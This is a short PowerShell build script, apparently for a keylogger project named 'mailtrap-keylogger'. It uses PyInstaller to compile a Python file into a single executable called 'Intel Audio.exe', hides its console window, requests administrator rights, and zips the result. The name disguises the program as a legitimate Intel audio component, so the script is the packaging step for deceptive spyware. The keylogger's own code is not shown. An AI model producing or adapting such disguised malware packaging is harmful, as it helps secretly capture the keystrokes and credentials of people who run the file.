$ProjectPath = "$env:USERPROFILE\hack\mailtrap-keylogger"
$venvScript  = "$ProjectPath\env\bin\activate.ps1"
$DistPath    = "$ProjectPath\dist"
$DistFile    = "$DistPath\Intel Audio.exe"
$DistZip     = "$DistPath\Intel Audio.zip"


pyinstaller --clean --onefile --nowindowed --noconsole --hide-console hide-early -i .\icon.ico --uac-admin --disable-windowed-traceback '.\Intel Audio.py'
if (-Not (Test-Path $DistZip)) {
    Compress-Archive -Path $DistFile -DestinationPath $DistZip
    Write-Output "Dist zip created"
} else {
    Remove-Item -Force -Path $DistZip
    Write-Output "Dist zip removed"
    Compress-Archive -Path $DistFile -DestinationPath $DistZip
    Write-Output "Dist zip created"
}
